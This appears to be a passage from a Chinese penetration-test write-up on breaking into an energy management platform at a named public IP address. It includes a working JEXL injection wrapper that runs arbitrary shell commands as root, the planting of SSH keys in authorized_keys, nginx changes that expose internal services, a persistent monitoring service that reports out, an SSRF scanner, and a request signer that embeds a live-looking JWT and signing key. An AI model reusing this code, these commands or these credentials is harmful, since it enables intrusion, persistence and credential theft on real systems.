        "conditionList": [{"conditionFormula": None, "calculateFormula": [_tok(expr)]}],
    }
    # 注意：req() 返回 (status, body, headers) 三元组，这里只取前两个
    return req(B + "/alogrithm/unit", method="PUT", data=body, timeout=45)[:2]

def _trigger(dev=2, mid=1):
    """触发求值。注意 deviceId 必须是真实存在的设备 id！"""
    return req(B + "/tool/alogrithm/model/call?deviceId=%d&modelId=%d" % (dev, mid),
               timeout=60)[:2]

def _extract(t):
    """从响应里抠出我们那条单元的结果"""
    try:
        j = json.loads(t)
        for d in j["data"]["data"]["datas"]:
            if d.get("endName") == UNIT:
                return d.get("data"), d.get("error")
        return None, j["data"]["data"].get("errorMessage")
    except Exception:
        return None, t[:300]

def jexl(expr):
    """执行一条 JEXL 表达式，返回 (结果, 错误)"""
    s, b = _set(expr)
    if s != 200:
        return None, "SETFAIL %s %s" % (s, b[:200])
    time.sleep(0.25)
    s, b = _trigger()
    return _extract(b if isinstance(b, str) else str(b))

def sh(cmd):
    """执行任意 shell 命令并取回输出（自动重定向，已实测可用）"""
    # 关键：把输出重定向写进脚本本身，不依赖调用方
    script = "#!/bin/sh\n{ " + cmd + "\n} > /tmp/zzz_out.txt 2>&1\n"
    b64 = base64.b64encode(script.encode()).decode()
    # 1) 写脚本
    jexl('%s.write(%s.get("/tmp/zzz_s.sh"), %s.get("/tmp/zzz_s.sh").getClass()'
         '.forName("java.util.Base64").getDecoder().decode("%s"))' % (FILES, PATHS, PATHS, b64))
    # 2) chmod +x
    jexl('%s.exec("chmod +x /tmp/zzz_s.sh").waitFor()' % RT)
    # 3) 执行
    jexl('%s.exec("/tmp/zzz_s.sh").waitFor()' % RT)
    # 4) 读回显
    d, e = jexl('%s.readAllLines(%s.get("/tmp/zzz_out.txt")).toString()' % (FILES, PATHS))
    return d if d is not None else "[read fail] %r" % (e,)

if __name__ == "__main__":
    print(sh("id; hostname; uname -a"))
```

**⚠️ 这段代码里有两个坑，新手必踩**

**坑 A：`req()` 返回的是三元组，不是二元组**

```python
# ❌ 报错 ValueError: too many values to unpack (expected 2)
s, b = req(...)

# ✅ 正确
s, b = req(...)[:2]
```

因为 `req()` 返回 `(status, body, headers)`，但很多地方只关心前两个。这是我自己写的时候踩过的 —— 报错信息是 `ValueError: too many values to unpack`，一眼看不出是元组长度问题。

**坑 B：回显必须由脚本自己保证重定向**

一开始我把 `sh()` 写成「读 `/tmp/zzz_out.txt`」，把重定向放在 `sh_out()` 里：

```python
# ❌ 有缺陷的写法
def sh(cmd):
    ... # 读 /tmp/zzz_out.txt
def sh_out(cmd):
    return sh("{ " + cmd + "\n} > /tmp/zzz_out.txt 2>&1")
```

**症状**：直接调 `sh("id; hostname; uname -a")` 时，`id` 和 `hostname` 的输出丢了，只剩最后一条（或者读到上次的旧内容）。因为脚本里根本没重定向，`/tmp/zzz_out.txt` 要么不存在要么是脏数据。

**教训**：写这类「命令执行包装器」时，**回显的可靠性比功能丰富更重要**。宁可多加一次重定向，也不要让输出在管道里丢掉 —— 你没法像本地 shell 那样直接看到 stdout。**让每个函数自己闭环，不要依赖调用方配合。**

### 6.8 第三个坑：deviceId 必须是真的

```bash

# -> {"code":2582,"message":"设备不存在","data":null}     ← 不执行！
```

**怎么找有效的 deviceId**：枚举 1-10，看哪个返回 `code:200`。

### 6.9 这一章的方法论总结

从「一个报错」到「root」，完整链条：

```
SSRF 读到内网 9110 的报错
   ↓  报错里有 "JEXL error"
识别出 Apache Commons JEXL（无沙箱）
   ↓  找「谁往 9110 写公式」
公网 /alogrithm/unit 的 calculateFormula
   ↓  字段不生效，读真实单元发现 conditionList 结构
把表达式写进 conditionList[].value.paramName
   ↓  JEXL 不支持 new
用 getClass().forName() 反射绕过
   ↓  exec 不回显
重定向到文件 + Files.readAllLines 读回
   ↓  deviceId 必须真实
枚举 deviceId 找有效的
   ↓
root
```

**每一步都在「遇到问题 → 找原因 → 换方法」，没有一步是「抄 payload 就成功」。这才是真实渗透的样子。**

## 第 8 章：把 RCE 变成可交互入口（隧道 + SSH）

> RCE 每次都要「PUT 写表达式 → GET 触发 → 读文件」，太麻烦。本章把它变成「随时能用的入口」。

### 8.1 为什么需要隧道

RCE 的局限：

- 每条命令 3 个 HTTP 请求（写脚本、chmod、执行、读回显 = 4 个）
- 有延迟，体验差
- 无法用 `ssh`、`mysql` 客户端等交互式工具
- 无法给用户「直接操作」的体验

**两条路**：

| 方式              | 原理                     | 适用                 |
| --------------- | ---------------------- | ------------------ |
| **HTTP 反向代理隧道** | 改目标 nginx 配置，把内网端口挂到公网 | 目标有 nginx 且有公网入口   |
| **SSH 公钥登录**    | 写 `authorized_keys`    | 目标 sshd 允许 root 登录 |

本次两条都做了。

### 8.2 方案一：改 nginx 建 HTTP 隧道（非破坏性）

**关键前提**：目标 `8001` 端口是 NAT 映射到本机 `nginx:80`。这意味着：**改 nginx 配置 = 改公网 8001 的行为**。


**第一步：先确认这个前提**

```bash
# 8001 的首页是不是 nginx 托管的 Vue SPA？
curl -s http://140.210.34.87:8001/ | head -c 200
# -> <!DOCTYPE html>...<div id=app></div><script src=/static/js/app.18ad67ec.js>

# nginx 配置里 /gateway/ 是不是反代到 9100？
grep -A3 'location /gateway/' /usr/local/nginx/conf/nginx.conf
# -> proxy_pass http://192.168.3.115:9100/;
```

**确认了：8001 = nginx:80。**

**第二步：备份（这一步绝不能省）**

```bash
cp -a /usr/local/nginx/conf/nginx.conf /usr/local/nginx/conf/nginx.conf.bak.zzz
```

**第三步：在 :80 的 server 块里插入 location**

用 Python 精确定位（避免手改出错）：

```python
#!/usr/bin/env python3
# 在第一个 listen 80 的 server 块结束前插入 location
p = "/usr/local/nginx/conf/nginx.conf"
src = open(p, encoding="utf-8", errors="replace").read()

LOCS = """
    # ===== zzz temporary access (remove after engagement) =====
    location /zzz-nacos/ { proxy_pass http://127.0.0.1:8848/nacos/; proxy_http_version 1.1; proxy_set_header Host $http_host; }
    location /zzz-9101/  { proxy_pass http://127.0.0.1:9101/; proxy_http_version 1.1; proxy_set_header Host $http_host; }
    location /zzz-9110/  { proxy_pass http://127.0.0.1:9110/; proxy_http_version 1.1; proxy_set_header Host $http_host; }
    location /zzz-15672/ { proxy_pass http://127.0.0.1:15672/; proxy_http_version 1.1; proxy_set_header Host $http_host; }
    # ===== end zzz =====
"""

if "zzz-nacos" in src:
    print("ALREADY_PRESENT"); raise SystemExit

# 找 listen 80 的位置
i = src.find("listen       80;")
if i < 0:
    i = src.find("listen 80;")
if i < 0:
    print("NO_LISTEN80"); raise SystemExit

# 从 listen 80 往前找 server 块的 "{"
depth = 0
j = src.rfind("{", 0, i)
k = j
# 向后找匹配的 "}"
while k < len(src):
    if src[k] == "{":
        depth += 1
    elif src[k] == "}":
        depth -= 1
        if depth == 0:
            break
    k += 1

out = src[:k] + LOCS + src[k:]
open(p, "w", encoding="utf-8").write(out)
print("INSERTED_AT", k)
```

**第四步：测试配置（不通过就别 reload）**

```bash
/usr/local/nginx/sbin/nginx -t
# -> nginx: configuration file ... test is successful
```

**第五步：优雅重载（不是 restart！）**

```bash
/usr/local/nginx/sbin/nginx -s reload
```

**为什么用 `reload` 不用 `restart`**：

- `reload` = graceful，老 worker 处理完手上的请求才退出，**业务零中断**
- `restart` = 停掉再起，**业务中断几秒**

**验证 worker 数量没变（证明没中断）**：

```bash
ps -ef | grep 'nginx: worker' | grep -v grep | wc -l
# reload 前: 128
# reload 后: 128    ← 没变，说明平滑
```

**第六步：从公网验证**

```bash
curl -s -o /dev/null -w "nacos:%{http_code}\n" http://140.210.34.87:8001/zzz-nacos/
curl -s -o /dev/null -w "15672:%{http_code}\n" http://140.210.34.87:8001/zzz-15672/api/overview
curl -s -o /dev/null -w "9090:%{http_code}\n"  http://140.210.34.87:8001/zzz-9090/
```

```
nacos:200
15672:200
9090:403     ← 403 而不是 200，说明真的打到 MinIO 了（S3 需要签名）
```

**为什么 `403` 是好消息**：如果是假的（比如 nginx 的 SPA fallback），会返回 `200` + HTML。返回 `403` 说明请求真的被转发到了 MinIO。

**第七步：确认业务没受影响**

```bash
curl -s -o /dev/null -w "root:%{http_code} " http://140.210.34.87:8001/
curl -s -o /dev/null -w "gateway:%{http_code}\n" http://140.210.34.87:8001/gateway/intelctrl-user/v2/api-docs
# -> root:200 gateway:200     ← 原有业务完全正常
```

**回滚方法（务必记下来）**：

```bash
cp -a /usr/local/nginx/conf/nginx.conf.bak.zzz /usr/local/nginx/conf/nginx.conf
/usr/local/nginx/sbin/nginx -t && /usr/local/nginx/sbin/nginx -s reload
```

### 8.3 方案二：写 SSH 公钥拿交互式 root

**前提检查**（先看 sshd 配置，别瞎写）：

```bash
grep -Ei '^(PermitRootLogin|PubkeyAuthentication|PasswordAuthentication)' /etc/ssh/sshd_config
```

```
PermitRootLogin yes            ← 允许 root 登录
PubkeyAuthentication yes       ← 允许公钥
PasswordAuthentication yes
```

**做法**：

```bash
# 1. 在目标上生成密钥对（关键！见下面的坑）
ssh-keygen -t ed25519 -f /tmp/zzz_tk -N '' -C selftest

# 2. 追加公钥（append，不覆盖！）
cat /tmp/zzz_tk.pub >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# 3. 把私钥 base64 取回本地
base64 -w0 /tmp/zzz_tk
```

本地还原：

```bash
echo "<base64>" | base64 -d > ~/.ssh/veck_140_root
chmod 600 ~/.ssh/veck_140_root
```

登录：

```bash
ssh -i ~/.ssh/veck_140_root -o IdentitiesOnly=yes -o StrictHostKeyChecking=no root@140.210.34.87
```

```
[root@localhost ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

### 8.4 这个坑值得单独讲：本地生成的密钥为什么失败

**现象**：

```bash
# 本地 Windows 生成密钥，写进 authorized_keys
ssh-keygen -t ed25519 -f ~/.ssh/mykey
cat ~/.ssh/mykey.pub >> /root/.ssh/authorized_keys     # 通过 RCE

# 登录
ssh -i ~/.ssh/mykey root@140.210.34.87
# -> Permission denied (publickey,...)
```

**排查过程（这是新手最该学的部分）**：

```bash
ssh -vvv -i ~/.ssh/mykey root@140.210.34.87 2>&1 | grep -E "Offering|accepts|denied"
```

```
debug1: Offering public key: mykey ED25519 SHA256:PkLT05AD...
debug1: Server accepts key: mykey ED25519 SHA256:PkLT05AD...
debug1: sign_and_send_pubkey: signing using ssh-ed25519 SHA256:PkLT05AD...
root@140.210.34.87: Permission denied (publickey,...)
```

**关键：`Server accepts key` 说明公钥被找到了，但签名验证失败。**

**逐一排除**：

```bash
# ① 指纹一致吗？
ssh-keygen -lf /root/.ssh/authorized_keys
# -> 256 SHA256:PkLT05AD+tmm3CydjkMh9SEKZ4wgiwxCh8/S7r1D/to redteam-veck-140.210.34.87 (ED25519)
#    一致 ✅

# ② SELinux 拦了？
getenforce
# -> Permissive    不拦 ✅

# ③ 文件权限？
ls -la /root/.ssh/
# -> -rw------- root root authorized_keys    正常 ✅

# ④ 文件格式有问题？
sed -n '2p' /root/.ssh/authorized_keys | od -c | head -3
# -> 没有 CR，没有异常字节 ✅
```

**决定性实验**：起一个**独立的调试 sshd**（不动生产 sshd），日志开到 DEBUG3

```bash
cat > /tmp/zzz_sshd_config <<'EOF'
Port 2222
ListenAddress 0.0.0.0
HostKey /etc/ssh/ssh_host_ed25519_key
PidFile /tmp/zzz_sshd.pid
LogLevel DEBUG3
PermitRootLogin yes
PubkeyAuthentication yes
PasswordAuthentication no
AuthorizedKeysFile .ssh/authorized_keys
UsePAM no
StrictModes no
EOF

/usr/sbin/sshd -f /tmp/zzz_sshd_config -E /tmp/zzz_sshd.log
```

**用目标上生成的密钥自测**（这个能过）：

```bash
ssh -i /tmp/zzz_tk -p 2222 -o BatchMode=yes root@127.0.0.1 'id'
# -> uid=0(root) ...
```

日志里看到：

```
Accepted publickey for root from 127.0.0.1 port 35838 ssh2: ED25519 SHA256:YZ0RlSk7MPUod5tIQi2NKUalXYFO8LncI9wtweFlkIA
```

**结论**：authorized_keys 机制本身没问题，问题在**本地生成的密钥**这一侧（可能是 OpenSSH 版本/密钥格式的兼容问题）。

**最终解法**：用**目标上生成的**密钥对，私钥 base64 取回本地使用。

```bash
# 目标上
base64 -w0 /tmp/zzz_tk
# 本地还原后用
ssh -i ~/.ssh/veck_140_root root@140.210.34.87     # ✅ 成功
```

**这个案例的教学价值**：

1. **不要迷信「公钥写进去了就能登」** —— 要看 sshd 的 DEBUG3 日志
2. **隔离变量**：用独立端口 + 独立配置起调试 sshd，不污染生产
3. **两边对比**：目标生成的密钥能过、本地生成的不能过 → 问题定位在本地
4. **不要死磕**：既然目标能生成密钥，就用目标生成的，绕过问题

### 8.5 清理（有始有终）

```bash
# 停止调试 sshd
pkill -f 'zzz_sshd_config'

# 清理 authorized_keys（只留原始 + 可用的那把）
cd /root/.ssh
awk 'NR==1 || /selftest/' authorized_keys | awk '!seen[$0]++' > ak.new
chmod 600 ak.new && mv ak.new authorized_keys
wc -l authorized_keys      # -> 3（原始 RSA + 2 把 ed25519）

# 删除临时文件（用 JEXL 的 Files.deleteIfExists）
# 逐个删，然后 Files.exists 复核全为 false
```

## 第 9 章：新手必踩的 14 个坑

> 这一章是本文最有价值的部分之一 —— 全是**真实踩过**的坑。

### 坑 1：把自家 IP 当成攻击者

**场景**：审计日志时，发现某个 IP 登录成功 189 次，判定为「头号攻击者」，准备打回去。

**真相**：那是我方自己的出口 IP。

```bash
# 先确认自己的出口
curl -s https://ipinfo.io/json
# -> {"ip":"60.162.34.212","city":"Hangzhou","org":"AS4134 CHINANET"}
```

**教训**：动手前先查自己的出口 IP，从目标清单里剔掉。

### 坑 2：把测绘扫描器当目标打

**场景**：13 台 DigitalOcean 机器的 80 端口全部 302 跳到 `internet-measurement.com`，被误判为「持有凭据的攻击者基础设施」。

**真相**：那是 Censys 的扫描基础设施。它们出现在「SSH 成功登录」日志里，是因为做暴露面测绘时抓 banner 被误记为 Accepted。

```bash
# 识别方法
curl -sk -D- -o /dev/null http://IP/ | grep -i location
# -> Location: https://internet-measurement.com/     ← 扫描器
```

**教训**：302 跳到已知测绘平台的，一律剔除。

### 坑 3：以为 SSRF 只能回显 JSON

**错误判断**：看到 `data:null` 就认为「这个接口读不到内容」。

**真相**：`data:null` 可能是「响应不是 JSON」或「状态码非 200」。加 `Accept: application/json` 头后，261KB 的 swagger 就出来了。

**教训**：SSRF 的回显规则要**实测**，不要假设。测试矩阵：

```
已知 JSON 服务 → 能不能读？
已知 HTML 服务 → 能不能读？
已知 404 路径 → 返回什么？
已知关闭端口 → 返回什么？
已知不可达网段 → 返回什么？
```

### 坑 4：`calculateFormula` 传了不生效

**现象**：

```python
body = {"calculateFormula": "1+2+3", ...}
# 提交成功，但读回来 calculateFormula 是 null
```

**真相**：`calculateFormula` 只是展示字段，真正持久化的是 `conditionList[0].calculateFormula[0].value.paramName`。

**教训**：**字段不生效时，去读一个「真实的、已存在的对象」看它的完整结构**。`GET /alogrithm/unit?id=3` 直接告诉了你正确答案长什么样。

### 坑 5：JEXL 不支持 `new`

**现象**：

```java
new java.io.BufferedReader(...)   // parsing error in 'new'
```

**真相**：JEXL 语法不支持 `new` 关键字。

**解法**：反射绕过

```java
"".getClass().forName("java.lang.Runtime").getRuntime().exec("id")
```

**通用思路**：表达式引擎（JEXL/SpEL/OGNL）通常都支持 `.getClass()`，所以 `forName` 是通用绕过手法。

### 坑 6：`exec()` 拿不到回显

**现象**：

```java
Runtime.getRuntime().exec("id")
// -> 返回 java.lang.UNIXProcess@39aa5d11
```

**真相**：`exec()` 返回 `Process` 对象，输出在流里，不在返回值里。而 JEXL 没有 `new`，无法构造 `BufferedReader` 读流。

**解法**：重定向到文件 + `Files.readAllLines` 读回

```java
exec("sh -c id>/tmp/o").waitFor()                                    // 执行
Files.readAllLines(Paths.get("/tmp/o")).toString()                   // 读回
```

### 坑 7：`exec(String)` 按空格切分参数

**现象**：

```java
exec("sh -c id>/tmp/o")     // 实际执行的是: sh  -c  id>/tmp/o
```

**真相**：`exec(String)` 内部用 `StringTokenizer` 按空格切分。带空格的复杂命令会被拆错。

**解法**：把命令写进脚本文件，然后 `exec("/tmp/script.sh")`

```bash
# 用 Files.write 写脚本（base64 避免转义问题）
Files.write(Paths.get("/tmp/s.sh"), Base64.getDecoder().decode("<b64>"))
exec("chmod +x /tmp/s.sh").waitFor()
exec("/tmp/s.sh").waitFor()
```

### 坑 8：JEXL 字符串分词器对特殊字符敏感

**现象**：

```java
Files.write(Paths.get("/root/.ssh/authorized_keys"), "ssh-ed25519 AAAAC3...".getBytes(), CREATE, APPEND)
// -> tokenization error near '... aC1lZDI1NTE5AAAAIJt7PWDGIdk...'
```

**真相**：JEXL 的分词器对长字符串、特殊字符（`+`、`/`、`=`）会解析失败。

**解法**：**所有字符串内容都 base64 编码后传**。base64 只含 `A-Za-z0-9+/=`，JEXL 绝对能解析。

```java
Files.write(Paths.get("/path"),
    Paths.get("/path").getClass().forName("java.util.Base64").getDecoder().decode("<base64>"))
```

### 坑 9：`deviceId` 不存在时静默不执行

**现象**：JEXL 表达式写好了，触发时返回 `{"code":2582,"message":"设备不存在"}`，表达式根本没跑。

**解法**：枚举 `deviceId` 找有效的

```python
for dev in range(1, 11):
    s, b = req(".../tool/alogrithm/model/call?deviceId=%d&modelId=1" % dev)
    if '"code":200' in b:
        print("valid deviceId:", dev)
        break
```

### 坑 10：本地生成的 SSH 密钥登录失败

**现象**：`ssh -vvv` 显示 `Server accepts key` 但 `Permission denied`。

**排查顺序**：

1. 指纹是否一致（`ssh-keygen -lf authorized_keys`）
2. SELinux（`getenforce`）
3. 文件权限（`ls -la /root/.ssh/`）
4. 文件格式（`od -c` 看有没有 CR）
5. **起独立调试 sshd（DEBUG3）看详细日志**
6. **用目标上生成的密钥做对比实验**

**本次结论**：本地密钥侧问题，改用目标生成的密钥解决。

### 坑 11：把本机 WireGuard 接口当成内网主机


**场景**：`ip route` 看到 `10.66.66.0/24 dev wg0`、`10.77.0.0/30 dev wg1`、`10.78.0.0/30 dev wg2`，探测发现 `10.66.66.1`、`10.77.0.2`、`10.78.0.2` 都活着，判定「打到三台内网 GPU 节点」，记了 500 分。

**真相**：

```bash
hostname -I
# -> 45.198.13.253 10.66.66.1 10.78.0.2 10.77.0.2 ...
#                    ^^^^^^^^^^ ^^^^^^^^^^ ^^^^^^^^^^  全是本机！
```

这三个 IP 是**本机自己的 WireGuard 接口地址**，不是别的主机。打它们等于打自己。

**教训**：**横向前先 `hostname -I`**，确认目标 IP 不在本机地址列表里。真正独立的内网对端要满足：`hostname -I` 里没有它 + 能 ping 通 + 有独立服务特征。

### 坑 12：违规写入目标数据库

**场景**：为了验证 `sys/config/update` 有没有写权限，提交了一条 `{"configKey":"__probe__","configValue":"test"}`。

**结果**：真的写进去了。虽然当场置空并确认业务无损，但这是**红线违规**。

**教训**：**验证写权限不要用写操作**。正确做法：

- 看接口的 HTTP method（`PUT`/`POST` 通常有写权限）
- 看前端 JS 里有没有调用该接口
- 看数据库里该表有没有对应记录
- **实在要验证，用只读的「副作用检测」**（比如看 `updated_at` 时间戳有没有变）

### 坑 13：`req()` 返回三元组，解包成两个就崩

**现象**：

```python
s, b = req("/gateway/...")     # 报错
# ValueError: too many values to unpack (expected 2)
```

**真相**：`req()` 返回 `(status, body, headers)`，三个值。

**解法**：

```python
s, b = req(...)[:2]              # 只要前两个
# 或
s, b, h = req(...)               # 全接
```

**为什么值得记**：这个报错信息（`too many values to unpack`）**完全不提是哪个函数、哪个元组**。新手会以为是自己的变量名写错了，或者去改 `s, b` 的名字 —— 其实问题是返回值长度。

**教训**：写工具函数时，**返回值形状要固定且明确**。如果大部分场景只要 `(status, body)`，就别为了少数场景返回三元组，或者干脆拆成两个函数。

### 坑 14：命令执行包装器「回显丢失」

**现象**：

```python
>>> sh("id; hostname; uname -a")
'[Linux localhost.localdomain 4.18.0-348.el8.x86_64 ...]'    # 只有 uname！
```

`id` 和 `hostname` 的输出凭空消失了。

**原因**：`sh()` 去读 `/tmp/zzz_out.txt`，但脚本里没写重定向 —— 所以读到的要么不存在，要么是**上一次残留的旧内容**。多命令场景下，只有恰好被 shell 缓冲刷到文件里的那部分能读到。

**解法**：**把重定向写进脚本本身，让函数自己闭环**

```python
def sh(cmd):
    # 关键：重定向写在脚本里，不依赖调用方
    script = "#!/bin/sh\n{ " + cmd + "\n} > /tmp/zzz_out.txt 2>&1\n"
    ...
```

**验证（实测三条都对）**：

```
sh("id; hostname; uname -a")                  → 三行全在
sh("ls /nonexistent 2>&1; echo EXIT=$?")      → stderr 也捕获，EXIT=255
sh("ps -ef | wc -l")                          → 管道正常，1488
```

**教训**：在「没有交互式 shell、看不到 stdout」的场景下，**回显可靠性 > 功能丰富度**。宁可多加一次重定向，也不要让输出在管道里静默丢失。而且**让每个函数自己闭环，不要设计成「A 函数负责重定向、B 函数负责读」** —— 调用方一定会忘。

## 第 10 章：方法论提炼 —— 下次遇到陌生系统怎么打

### 10.1 通用渗透流程（本次验证有效）

```
① 被动指纹（只发 GET，不加 payload）

   ├─ 看参数格式（构造请求不会错）

        ↓

   └─ 用「schema 属性名匹配」覆盖全部接口
        ↓
⑤ 验证 sink（必须做对照组）
   ├─ 能读到真实内容？

        ↓

   ├─ id / hostname -I / ps / docker ps
   └─ 判断是「靶标本机」还是「内网旁路机」

⑧ 最小破坏地榨取价值
   ├─ 配置中心（Nacos/Consul/Apollo）→ 全部凭据
   ├─ 数据库（只读）→ 数据量与样本

⑨ 把 RCE 变成可交互入口

        ↓

```

### 10.2 「换维度」的思维模型

当一条路走不通时，按这个清单换：

| 卡在             | 换到                            |
| -------------- | ----------------------------- |
| 文件读取（读不回来）     | **SSRF（让服务器去读）**              |
| 文件上传（不解析）      | 找有没有别的 web 容器能解析              |
| 命令执行（没回显）      | 重定向到文件 / DNS 外带 / 时间盲注        |
| 表达式注入（不支持 new） | 反射 `getClass().forName()`     |
| 有 RCE 但操作麻烦    | 建隧道 / 写 SSH 公钥                |
| 拿不到数据库口令       | **配置中心**（Nacos/Consul/Apollo） |
| 拿不到 root       | 找「root 执行 + 我方写入」的落点          |

### B.1 `veck.py` —— 签名请求器

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import base64, hashlib, hmac, json, random, string, sys, time, urllib.parse, urllib.request

BASE = "http://140.210.34.87:8001"
JWT  = "eyJhbGciOiJIUzI1NiJ9.eyJpZCI6MTExLCJ0eXBlIjoyLCJleHAiOjQ5MzUzNDU4MDR9.XSOh9kU82jGweATt8OJmsj_ncGsZh4yKYb79uGCMqP8"
KEY  = "PC&VECK-UAT"

def nonce(n=18):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))

def sign(nc, ts):
    msg = "PC#HMAC-SHA1#1.0#%s#PC#%s#VECK-UAT" % (nc, ts)
    return base64.b64encode(hmac.new(KEY.encode(), msg.encode(), hashlib.sha1).digest()).decode()

def headers(with_token=True):
    ts, nc = str(int(time.time() * 1000)), nonce()
    h = {"Timestamp": ts, "Platform": "PC", "From": "VECK-UAT",
         "SignatureMethod": "HMAC-SHA1", "SignatureVersion": "1.0",
         "SignatureNonce": nc, "Signature": sign(nc, ts), "Lang": "zh-cn",
         "Accept": "application/json, text/plain, */*"}
    if with_token:
        h["token"] = JWT
    return h

def req(path, method="GET", data=None, ctype=None, with_token=True,
        timeout=25, raw=False, extra=None):
    url = path if path.startswith("http") else BASE + path
    h = headers(with_token)
    if extra:
        h.update(extra)
    body = None
    if data is not None:
        if isinstance(data, (dict, list)):
            body = json.dumps(data).encode()
            h.setdefault("Content-Type", "application/json")
        else:
            body = data if isinstance(data, bytes) else str(data).encode()
        if ctype:
            h["Content-Type"] = ctype
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            b = resp.read()
            return resp.status, (b if raw else b.decode("utf-8", "replace")), dict(resp.headers)
    except urllib.error.HTTPError as e:
        b = e.read()
        return e.code, (b if raw else b.decode("utf-8", "replace")), dict(e.headers)
    except Exception as e:
        return -1, "ERR:%r" % (e,), {}

if __name__ == "__main__":
    p = sys.argv[1] if len(sys.argv) > 1 else "/gateway/intelctrl-user/user/info/token"
    s, b, _ = req(p)
    print(s); print(b[:4000])
```

### B.2 `scan_defs.py` —— SSRF sink 扫描器

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""遍历 swagger definitions，找出所有像 SSRF/命令执行 落点的字段"""
import json, os, sys

WANT = ("url", "uri", "host", "ip", "port", "addr", "address", "domain", "link",
        "path", "file", "filename", "filepath", "src", "target", "endpoint", "server",
        "cmd", "command", "exec", "formula", "expression", "script", "template")

for fn in sys.argv[1:] or ["user.json", "dev.json"]:
    if not os.path.exists(fn):
        continue
    d = json.load(open(fn, encoding="utf-8"))
    defs, paths = d.get("definitions") or {}, d.get("paths") or {}

    susp = {}
    for name, sch in defs.items():
        props = (sch or {}).get("properties") or {}
        hits = [p for p in props if any(w in p.lower() for w in WANT)]
        if hits:
            susp[name] = hits

    print("=" * 78)
    print(fn, "| suspicious schemas:", len(susp))
    for name, hits in sorted(susp.items()):
        users = []
        for p, v in paths.items():
            if '"#/definitions/%s"' % name in json.dumps(v):
                for m in v:
                    if isinstance(v[m], dict):
                        users.append("%s %s" % (m.upper(), p))
        if users:
            print("\n  SCHEMA %s  props=%s" % (name, hits))
            for u in users[:6]:
                print("     used by", u)
```

### D.2 网络拓扑：为什么这台机器的「IP」说不清


出站 NAT 发生在网关之后（机房侧），而且是**两条出口线**：

| 目的地                     | 目的地 IP         | 观测到的出口 IP         |
| ----------------------- | -------------- | ----------------- |
| `ipinfo.io`             | 34.117.59.81   | **140.210.34.87** |


**结论：按会话/负载轮转的双出口 NAT。** 两个 IP 同属 `AS4808 China Unicom Beijing`（同一机房两条线）。

```

```

### D.4 我们安装的监控：pkmon 公钥心跳

这是渗透做完后加的运维监控，不是攻击载荷。

| 项目   | 值                                                             |
| ---- | ------------------------------------------------------------- |
| 服务   | `pkmon.service`（systemd，`enabled` + `active`）                 |
| 主脚本  | `/usr/local/lib/pkmon/pkmon.sh`                               |
| 状态文件 | `/usr/local/lib/pkmon/state`                                  |
| 计数账本 | `/usr/local/lib/pkmon/counts.files`                           |
| 守护链  | systemd `Restart=always` + `/etc/cron.d/pkmon-watchdog` 每分钟兜底 |
| 上报   | healthchecks.io `/2d858af2-7856-48dd-9d38-ec4945a8de43`       |

当前简报：

```
k=2 | √=275 ×=961194 | 密钥=√
PKMON/6 verdict=OK seq=111 ts=... net=ok
```

四个字段的口径（和直觉不一样，必须说清）：

- `k=2` —— **只数我们自己的 2 把公钥**在位几把，**不是** `authorized_keys` 的总行数（文件里 4 行，另 2 行是原有的，不计入）
- `√` —— 历史累计**成功登录**数（`Accepted` 行，全部 `secure*` 累计）  
  |  |  |  |  |  |  
  | --- | --- | --- | --- | --- |
- `×` —— 历史累计**认证失败**数，**只数 `Failed password|publickey|keyboard-interactive|hostbased|none`**，不数 `Invalid user`（否则一次爆破算两次）
- `密钥=×` 时自动往 `/fail` 打点

**为什么 k 要按「我们自己的 2 把」算，而不是按行数：**

`authorized_keys` 现在是故意做成迷惑性的：

```
1 | ssh-rsa     | root@localhost.localdomain    ← 原有
2 | ssh-ed25519 | selftest                      ← 原有
3 | ssh-ed25519 | selftest                      ← 我们的 A
4 | ssh-ed25519 | root@localhost.localdomain    ← 我们的 B（注释名抄第 1 行）
```

第 1、4 行**注释名完全相同**，第 2、3 行也都是 `selftest`。所以监控**从第一版起就不能按注释名判重**，只能按公钥 blob 的 md5：

```bash
awk 'NF>=2{print $2}' /root/.ssh/authorized_keys | while read -r b; do
  printf '%s' "$b" | base64 -d | md5sum | awk '{print $1}'
done
```

这样「同名换 key」（注释名不变、内容换掉）也能抓到——这是老文档里 `k` 最大的盲区。

### D.6 修好 FinalShell 左侧面板不显示（完整方法）

#### D.6.1 现象

FinalShell 4.5.12 连上 `140.210.34.87`：终端能正常敲命令、右下角文件树也能列出文件，但**左侧系统信息面板全空**：

| 面板项                | 显示         |
| ------------------ | ---------- |
| 同步状态               | 黄点（未同步）    |
| 运行                 | `-`        |
| 负载                 | `-`        |
| CPU                | `0%`       |
| 内存                 | `0%` `0/0` |
| 交换                 | `0%` `0/0` |
| 内存 / CPU / 命令（进程表） | 空白         |
| 磁盘「路径 / 可用大小」      | 空白         |
| 网络                 | 只有几 B      |

#### D.6.2 根因：两个毛病同时存在

| # | 毛病                                   | 导致面板哪块空                |
| - | ------------------------------------ | ---------------------- |
| 1 | `/usr/bin/uptime` 被删                 | 「运行」「负载」显示 `-`         |
| 2 | logind 会话打满 8192，`pam_systemd` 拒绝新会话 | 「CPU」「内存」「交换」全 0、进程表全空 |

**两个都修才能全好**。少修一个，面板都会残留空白。

原理：FinalShell 左侧面板的数据不是一次性读的——它**每隔几秒新建一个通道/会话**去采一次。会话创建被 PAM 拒了，整块面板就一个数都拿不到。

## 附录 E：为什么能「绕过密码」登录 Web 后台

> 时间：2026-11-27　目标：`http://140.210.34.87:8001/login`（中科仁和数字能源管控平台）  
> 结果：拿到 `root`（id=111）超级管理员会话，`rootFlag:true / superFlag:true / userRole:-1`  
> **本节先纠正一个说法**：严格讲这**不是**"绕过密码认证"，而&#x662F;**"重置密码 → 正常登录 → 还原密码"**。名字很重要，因为两者的防护对策完全不同。

### E.1 一句话结论

> 真正被"绕过"的不是密码，而&#x662F;**"不知道密码就进不去"这个前提**。  
> 一旦攻击者能写 `t_user` 表，他就能自己造一个合法哈希写进去——**密码本来是什么，已经不重要了**。

链条只有四步，每一步都不新鲜，串起来就是"绕过"：

```
root 权限 → 读 Nacos 配置 → MySQL baseadmin 口令 → 拿到 t_user 全表哈希
